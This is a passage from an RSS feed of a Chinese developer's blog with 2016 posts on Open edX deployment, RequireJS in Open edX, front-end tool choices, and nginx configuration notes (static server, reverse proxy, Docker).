&lt;li&gt;欢迎小伙伴利用oauth机制将其用web技术做成跨平台应用（reactnative）&lt;/li&gt;
&lt;li&gt;移动端和前端小伙伴也可以用这些接口做练手项目，如果好用，可能被收购的哦233&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;近期实验特性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可切换的主题&lt;ul&gt;
&lt;li&gt;采用siteapi接口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分布式性能优化评测与调优&lt;ul&gt;
&lt;li&gt;高并发/瓶颈/监控 &lt;code&gt;-&amp;gt;&lt;/code&gt; 调优&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;小组聊天,p2p交流&lt;ul&gt;
&lt;li&gt;webrtc用于点对点&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;直播集成&lt;/li&gt;
&lt;li&gt;CDN&lt;/li&gt;
&lt;li&gt;跨平台笔记&lt;ul&gt;
&lt;li&gt;重心是笔记的加密功能（jwt）和定位功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;全站级别的消息通知&lt;ul&gt;
&lt;li&gt;信息流&lt;ul&gt;
&lt;li&gt;网站 &lt;code&gt;-&amp;gt;&lt;/code&gt; 用户（活动通知）&lt;/li&gt;
&lt;li&gt;用户 &lt;code&gt;-&amp;gt;&lt;/code&gt; 用户（私信）&lt;/li&gt;
&lt;li&gt;用户 &lt;code&gt;-&amp;gt;&lt;/code&gt; 网站（建议反馈）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;信息类型：&lt;ul&gt;
&lt;li&gt;论坛&lt;/li&gt;
&lt;li&gt;站点级别的活动通知&lt;/li&gt;
&lt;li&gt;课程通知&lt;ul&gt;
&lt;li&gt;订阅（多&lt;code&gt;-&amp;gt;&lt;/code&gt;多）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;技术架构：消息队列&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;说明&lt;/h1&gt;
&lt;p&gt;服务器配置低，暂时不对外开放，有访问需求的同学，可以给我发邮件索要http入口密码&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 17 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-17:Open-edx-test-platform.html</guid><category>edx</category></item><item><title>Open edX分布式部署建议</title><link>/edx-distributed-suggestion.html</link><description>&lt;blockquote&gt;
&lt;p&gt;过早优化是万恶之源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前段时间Open edX升级部分组件，导致分布式安装发生了变化，具体变更可以关注commit或者参考各个task的变量&lt;/p&gt;
&lt;p&gt;建议做分布式前，先检测瓶颈所在，这样能节约机器成本，且极大节省人力&lt;/p&gt;
&lt;p&gt;如果对ansible很熟，一切都好说，无非是做好配置和排错。如果对ansible不熟悉，ansible本身的学习成本是很高的，最好有个准备，&lt;/p&gt;
&lt;p&gt;如果你仅仅是分离数据库或缓存，手动就好了。对于数据库，只要安装 &lt;code&gt;-&amp;gt;&lt;/code&gt; 创建用户&lt;code&gt;-&amp;gt;&lt;/code&gt;建库&lt;code&gt;-&amp;gt;&lt;/code&gt;做好权限配置(包括网络可访问性)&lt;code&gt;-&amp;gt;&lt;/code&gt;migrate数据&lt;code&gt;-&amp;gt;&lt;/code&gt;在组件的配置文件里，做好数据库配置&lt;code&gt;-&amp;gt;&lt;/code&gt;restart，就好啦&lt;/p&gt;
&lt;p&gt;当然你也可以将全库导入导出&lt;/p&gt;
&lt;p&gt;缓存服务比较简单，就不赘述了&lt;/p&gt;
&lt;p&gt;不过手动的话也需要注意，edx的组件是分离的，而他们共用数据库，所以你需要做的配置可能分散在多处，至于有几处，需要看roles&lt;/p&gt;
&lt;p&gt;如果对性能要求高，建议先花时间把ansible学好，edx的ansible-playbook脚本已经充分把分布式考虑在内了。包括对mongo做主从，对mysql做主从，对消息队列和缓存做分布式&lt;/p&gt;
&lt;p&gt;如果压力来自django server，你应该对edxapp做分布式，然后做负载均衡&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 11 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-11:edx-distributed-suggestion.html</guid><category>edx</category></item><item><title>requirejs学习笔记及requirejs在Open edX中的使用</title><link>/requirejs-note.html</link><description>&lt;h1&gt;原理&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2012/10/javascript_module.html"&gt;Javascript模块化编程（一）：模块的写法&lt;/a&gt;:Javascript模块化编程&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html"&gt;Javascript模块化编程（二）：AMD规范&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2012/11/require_js.html"&gt;javascript模块化编程（三）：require.js的用法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;解决的问题&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;实现js文件的&lt;code&gt;异步&lt;/code&gt;加载，避免网页失去响应；&lt;/li&gt;
&lt;li&gt;管理模块之间的依赖性，便于代码的编写和维护。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Require.JS 是一个基于 AMD 规范的 JavaScript 模块加载框架  &lt;/li&gt;
&lt;li&gt;实现 JavaScript 文件的异步加载，管理模块之间的依赖性，提升网页的加载速度。&lt;/li&gt;
&lt;li&gt;AMD 是 Asynchronous Module Definition 的缩写，意思就是 异步模块定义。它采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;常见问题&lt;/h1&gt;
&lt;p&gt;参考&lt;a href="http://www.ruanyifeng.com/blog/2012/11/require_js.html"&gt;javascript模块化编程（三）：require.js的用法&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;模块的加载&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;使用require.config()方法，我们可以对模块的加载行为进行自定义&lt;ul&gt;
&lt;li&gt;require.config()就写在主模块（main.js）的头部&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;require.js提供了一个优化工具，当模块部署完毕以后，可以用这个工具将多个模块合并在一个文件中，减少HTTP请求数。&lt;/li&gt;
&lt;li&gt;如果某个模块在另一台主机上，也可以直接指定它的网址&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;　require.config({
　　　　paths: {
　　　　　　&amp;quot;jquery&amp;quot;: &amp;quot;https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min&amp;quot;
　　　　}
　　});
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;加载非规范的模块&lt;/h3&gt;
&lt;p&gt;require.config()接受一个配置对象，这个对象有一个shim属性，专门用来配置不兼容的模块。&lt;/p&gt;
&lt;h1&gt;入门&lt;/h1&gt;
&lt;h3&gt;require.js插件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;domready插件，可以让回调函数在页面DOM结构加载完成后再运行。&lt;/li&gt;
&lt;li&gt;text和image插件，允许require.js加载文本和图片文件&lt;/li&gt;
&lt;li&gt;json和mdown，用于加载json文件和markdown文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;requirejs官方入门文档&lt;/h1&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://requirejs.org/docs/start.html"&gt;HOW TO GET STARTED WITH REQUIREJS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/volojs/create-template"&gt;Simple one page app&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requirejs/example-multipage"&gt;Multipage app&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requirejs/example-multipage-shim"&gt;Multipage app with shim config&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Open edX与requirejs&lt;/h1&gt;
&lt;p&gt;Open edX前端采用了requirejs来管理模块依赖，这方面的相关文档可参考：&lt;openedx.atlassian.net/wiki&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/FEDX/How+to+add+a+new+page+to+LMS+or+Studio"&gt;How to add a new page to LMS or Studio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/FEDX/RequireJS+at+edX"&gt;RequireJS at edX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/FEDX/Integration+of+Require+JS+into+the+system"&gt;Integration of Require JS into the system&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;细节&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;/edx/app/edxapp/edx-platform/cms/static/js/base.js&lt;/li&gt;
&lt;li&gt;require-config.js (ack-grep  -g "require-config.js")&lt;ul&gt;
&lt;li&gt;/edx/app/edxapp/edx-platform/lms/static/lms/js/require-config.js&lt;/li&gt;
&lt;li&gt;/edx/app/edxapp/edx-platform/cms/static/cms/js/require-config.js&lt;ul&gt;
&lt;li&gt;在此可以写给mathjax cdn路径,mathjax&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;来看一下引用了require-config.js的地方(ack-grep  require-config.js)&lt;ul&gt;
&lt;li&gt;lms/templates/main.html&lt;ul&gt;
&lt;li&gt;页面开始的static_content.html来自common/djangoapps/pipeline_mako/templates/static_content.html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lms/static/lms/js/build.js&lt;/li&gt;
&lt;li&gt;cms/templates/base.html&lt;/li&gt;
&lt;li&gt;cms/static/cms/js/build.js&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;引用require.js的地方 （ack-grep require.js）&lt;ul&gt;
&lt;li&gt;cms/templates/base.html&lt;/li&gt;
&lt;li&gt;cms/envs/common.py&lt;/li&gt;
&lt;li&gt;lms/envs/common.py ，require.js被放在base_vendor_js里 &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;base_vendor_js&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/jquery.min.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/jquery.cookie.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/url.min.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/underscore-min.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/require.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/RequireJS-namespace-undefine.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/URI.min.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;js/vendor/backbone-min.js&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;main_vendor_js由包括了base_vendor_js，之后lms/templates/main_django.html中有：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  {% block main_vendor_js %}
  {% javascript &amp;#39;main_vendor&amp;#39; %}
  {% endblock %}
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;案例cms login&lt;/h3&gt;
&lt;p&gt;我们以cms的login.html为例(/edx/app/edxapp/edx-platform/cms/templates/login.html)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%block name=&amp;quot;requirejs&amp;quot;&amp;gt;
  require([&amp;quot;js/factories/login&amp;quot;], function(LoginFactory) {
      LoginFactory(&amp;quot;${reverse(&amp;#39;homepage&amp;#39;)}&amp;quot;);
  });
&amp;lt;/%block&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这部分就是添加自己逻辑的地方: /edx/app/edxapp/edx-platform/cms/static/js/factories/login.js&lt;/p&gt;
&lt;p&gt;可以看到这是按照AMD规范写的模块&lt;/p&gt;
&lt;p&gt;从这里我们也可以看到mako如何把参数传到js里&lt;/p&gt;
&lt;h3&gt;案例 search_results_view&lt;/h3&gt;
&lt;p&gt;其他案例包括&lt;a href="https://openedx.atlassian.net/wiki/display/FEDX/How+to+add+a+new+page+to+LMS+or+Studio"&gt;How to add a new page to LMS or Studio&lt;/a&gt;推荐的例子：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/blob/master/lms/static/js/search/course/views/search_results_view.js"&gt;search_results_view.js&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于ui方便，官方推荐使用backbone.js来写&lt;/p&gt;
&lt;h3&gt;案例asset（观察backbone的使用）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ack-grep backbone ，跟踪asset.js&lt;ul&gt;
&lt;li&gt;/edx/app/edxapp/edx-platform/cms/static/js/collections/asset.js&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ack-grep js/collections/asset&lt;ul&gt;
&lt;li&gt;static/js/factories/asset_index.js&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ack-grep "js/factories/asset_index"&lt;ul&gt;
&lt;li&gt;/edx/app/edxapp/edx-platform/cms/templates/asset_index.html&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%block name=&amp;quot;requirejs&amp;quot;&amp;gt;
    require([&amp;quot;js/factories/asset_index&amp;quot;], function (AssetIndexFactory) {
        AssetIndexFactory({
          assetCallbackUrl: &amp;quot;${asset_callback_url}&amp;quot;,
          uploadChunkSizeInMBs: ${chunk_size_in_mbs},
          maxFileSizeInMBs: ${max_file_size_in_mbs},
          maxFileSizeRedirectUrl: &amp;quot;${max_file_size_redirect_url}&amp;quot;
        });
    });
&amp;lt;/%block&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ack-grep asset_index.html&lt;ul&gt;
&lt;li&gt;djangoapps/contentstore/views/assets.py&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-&amp;gt; def assets_handler&lt;/li&gt;
&lt;li&gt;-&amp;gt; url(r'^assets/{}/{}?$'.format(settings.COURSE_KEY_PATTERN, settings.ASSET_KEY_PATTERN), 'assets_handler')&lt;ul&gt;
&lt;li&gt;对于studio课程里的&lt;code&gt;文件&amp;amp;上传&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 05 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-05:requirejs-note.html</guid><category>tools</category></item><item><title>前端近期观望与学习</title><link>/front-end-note.html</link><description>&lt;p&gt;如&lt;a href="https://medium.com/javascript-and-opinions/state-of-the-art-javascript-in-2016-ab67fc68eb0b"&gt;State of the Art JavaScript in 2016&lt;/a&gt;一文中所言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JS生态的最佳实践不再剧烈变更着，现在关于需要学什么越来越明确了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这句话的意思是在过去它曾剧烈变化着，今天不过是缓和一些，相对于自身的那种缓和&lt;/p&gt;
&lt;p&gt;我很喜欢《JavaScript 生态之乱象》里的这个批评：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;事实证明，我根本无法着手编写这个简单的项目，因为我陷入了一种分析瘫痪循环.到目前为止，我已经有了四到五次“失败的开始”。问题的核心是在 选择 上，以及要如何从过度繁多的工具库中挑选出合适的工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对我而言，前端是个炫酷而实用的领域，有趣却变化多端，在它稳定下来，并且人们就最佳实践达成一致的看法之前，我可能不打算把时间砸到某个具体框架里&lt;/p&gt;
&lt;p&gt;如果同样是探索，我可能更愿意把时间花在数据和机器学习上边&lt;/p&gt;
&lt;p&gt;所以对前端，保持关注和观望的状态&lt;/p&gt;
&lt;h1&gt;选型&lt;/h1&gt;
&lt;p&gt;以下是我保持关注，并试图学习的一些工具&lt;/p&gt;
&lt;h3&gt;语言&lt;/h3&gt;
&lt;p&gt;ES6配合&lt;a href="https://github.com/babel/babel"&gt;Babel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Babel是个可插拔ES6编译器&lt;/p&gt;
&lt;p&gt;ES6相关的资料可以参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/lukehoban/es6features"&gt;es6features&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/DrkSephy/es6-cheatsheet"&gt;es6-cheatsheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://es6.ruanyifeng.com/"&gt;ECMAScript 6入门(阮一峰)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;核心库&lt;/h3&gt;
&lt;p&gt;暂时关注&lt;a href="https://github.com/vuejs/vue"&gt;vue&lt;/a&gt;而不是&lt;a href="https://github.com/facebook/react"&gt;react&lt;/a&gt;，因为我的大多使用场景是个人或小团队，取其敏捷性&lt;/p&gt;
&lt;p&gt;vue的中文文档为&lt;a href="https://vuejs.org.cn/guide/"&gt;vuejs.org.cn&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;依赖管理&lt;/h3&gt;
&lt;p&gt;仅考虑NPM，CommonJS 和ES6模块&lt;/p&gt;
&lt;p&gt;放弃bower，使用webpack&lt;/p&gt;
&lt;h3&gt;构建工具&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/webpack/webpack"&gt;Webpack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不想在你的页面文件中加入非常多的外链Script引用，那你就需要一个构建工具来打包你的依赖。&lt;/p&gt;
&lt;p&gt;那么Gulp或Grunt呢？ Webpack比起来最适合处理静态资源。所以他们开始可以用来跑一些其他的任务（但是也不推荐），现在更简单的方法是直接用上 npm scripts&lt;/p&gt;
&lt;h3&gt;工具库&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/lodash/lodash"&gt;Lodash&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Http请求&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/github/fetch"&gt;fetch&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gold.xitu.io/entry/5705e71ed342d3005418ea66"&gt;JavaScript 生态之乱象&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gaohailang/blog/issues/12"&gt;2016/04/07 展望 Javascript 2016年的趋势和生态发展&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/news/69039/javascript-developer-survey-results"&gt;2015 年 JavaScript 开发者调查报告&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-04:front-end-note.html</guid><category>tools</category></item><item><title>nginx使用笔记</title><link>/nginx-note.html</link><description>&lt;h1&gt;安装&lt;/h1&gt;
&lt;h3&gt;ubuntu&lt;/h3&gt;
&lt;p&gt;sudo apt-get install nginx&lt;/p&gt;
&lt;h3&gt;编译安装&lt;/h3&gt;
&lt;p&gt;waiting (可以加入其它模块)&lt;/p&gt;
&lt;h3&gt;配置文件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;/etc/nginx //所有的配置文件&lt;/li&gt;
&lt;li&gt;/etc/nginx/sites-available //sites-available存放所有配置文件，无论是非启用&lt;/li&gt;
&lt;li&gt;/etc/nginx/sites-enabled   //软链接到sites-available，这里的符号链接代表启用&lt;/li&gt;
&lt;li&gt;/var/log/nginx  //日志&lt;/li&gt;
&lt;li&gt;/etc/init.d/  //该目录下有启动脚本&lt;/li&gt;
&lt;li&gt;/usr/share/nginx/www //默认的虚拟主机的目录&lt;/li&gt;
&lt;li&gt;/usr/sbin/nginx  //启动文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;日常管理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;sudo /etc/init.d/nginx start  //apt安装的启动方式&lt;/li&gt;
&lt;li&gt;sudo /etc/init.d/nginx restart  //重启&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;用例&lt;/h1&gt;
&lt;h3&gt;一个静态文件服务器&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo vim /etc/nginx/sites-available/static_server
sudo ln -s /etc/nginx/sites-available/static_server /etc/nginx/sites-enabled
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        client_max_body_size 4G;
        listen  80;  ## listen for ipv4; this line is default and implied
        #server_name static.test.sdk.iwplay.com.tw;
         root /home/wwj/static_dir;
         location / {
               #auth_basic   &amp;quot;Restricted&amp;quot;;  #认证模块
               #auth_basic_user_file /etc/nginx/pass_file;
               autoindex on; #显示索引
               autoindex_exact_size on; #显示大小
               autoindex_localtime on;  #显示时间
        }

}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;添加认证用户: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install apache2-utils
sudo touch /etc/nginx/pass_file
sudo htpasswd -c -d /etc/nginx/pass_file wwj718
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;反向代理&lt;/h3&gt;
&lt;p&gt;假设我们的网站跑在5000端口（flask demo）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        listen 8050;             #端口
        #server_name dylan.com;   #访问域名
        #root /home/bob/dylan/;
        access_log /tmp/access.log;
        error_log /tmp/access.log;
        location / {
                proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;
                proxy_set_header Host $http_host;
                proxy_redirect off;
                if (!-f $request_filename) {
                        proxy_pass http://127.0.0.1:5000;  #这里是flask应用的gunicorn端口
                        break;
                }
        }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们也时常反向代理到内网的服务器上，诸如: &lt;code&gt;proxy_pass http://192.168.100.2&lt;/code&gt;;&lt;/p&gt;
&lt;p&gt;如果内网服务器上有多个网站（server_name）,那么外层反向代理服务器需要先把server_name导向内网ip，然后内网服务器的nginx来处理具体请求,server_name写了两次。内网的配置不受影响&lt;/p&gt;
&lt;h3&gt;流媒体&lt;/h3&gt;
&lt;p&gt;ps：目前版本的nginx好像支持视频流，或者自己编译添加视频模块&lt;/p&gt;
&lt;p&gt;目前 WEB 上主流的视频直播方案有 HLS（HTTP Live Streaming） 和 RTMP，移动 WEB 端目前就只有 HLS 能用&lt;/p&gt;
&lt;h5&gt;docker镜像&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hub.docker.com/r/cine/hls-chopper-docker/"&gt;hls-chopper-docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/hls-chopper-docker/blob/master/service/config/nginx.conf"&gt;hls-chopper-docker nginx配置&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;docker&lt;/h1&gt;
&lt;p&gt;我们可以借助docker来使用使用nginx，借助-v参数，可将宿主机的目录映射到docker里，这样一来网站目录和配置文件都不是问题&lt;/p&gt;
&lt;pre&gt;sudo docker run -it -p 80:80 -v `pwd`/www:/www -v `pwd`/config:/etc/nginx/sites-enabled  -v `pwd`/logs:/var/log/nginx dockerfile/nginx&lt;/pre&gt;

&lt;p&gt;解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-v `pwd`/www:/www，将当前路径下的www目录设置为/www，和server配置的路径对应&lt;/li&gt;
&lt;li&gt;-v `pwd`/logs:/var/log/nginx,nginx运行时产生的日志&lt;/li&gt;
&lt;li&gt;-v `pwd`/config:/etc/nginx/sites-enabled，server文件的本地路径，映射到docker容器的nginx配置路径。config目录下放一个文件，名为server，Nginx静态网站配置文件,内容为&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        listen 80;

        root /www;
        index index.html index.htm;

        server_name localhost;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;参考&lt;a href="http://blog.shiqichan.com/Deploying-Nginx-with-Docker/"&gt;在Docker下部署Nginx&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;相关项目&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/h5bp/server-configs-nginx"&gt;server-configs-nginx&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Nginx HTTP server boilerplate configs&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a href="https://github.com/arut/nginx-rtmp-module"&gt;nginx-rtmp-module&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;NGINX-based Media Streaming Server&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/nginx-boilerplate/nginx-boilerplate"&gt;nginx-boilerplate&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Awesome Nginx configuration template&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a href="https://github.com/openresty/openresty"&gt;openresty&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Turning Nginx into a Full-Fledged Scriptable Web Platform  (高效)&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/lebinh/ngxtop"&gt;ngxtop&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Real-time metrics for nginx server&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a href="https://github.com/fatiherikli/nginxparser"&gt;nginxparser&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Parses nginx configuration with Pyparsing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Same as other serialization modules also you can export configuration with dump and dumps methods.&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/alexazhou/VeryNginx"&gt;VeryNginx&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;功能强大且拥有对人类友好界面的Nginx，提供防火墙，自定义行为，和统计功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你不想安装 OpenResty，或者你已经有了一个正在工作的 Nginx，你也可以自己手动为 Nginx 编译安装这些模块&lt;/p&gt;
&lt;h1&gt;遇到问题及解决方案&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Q1:you should increase server_names_hash_bucket_size: 32&lt;ul&gt;
&lt;li&gt;A: 在配置文件(/etc/nginx/nginx.conf)的http{}段增加一行配置 : &lt;code&gt;server_names_hash_bucket_size 64;&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/languoliang/archive/2013/04/01/nginx.html"&gt;Ubuntu中Nginx的安装与配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://imququ.com/post/html5-live-player-2.html"&gt;HTML5 视频直播&lt;/a&gt;&lt;/li&gt;
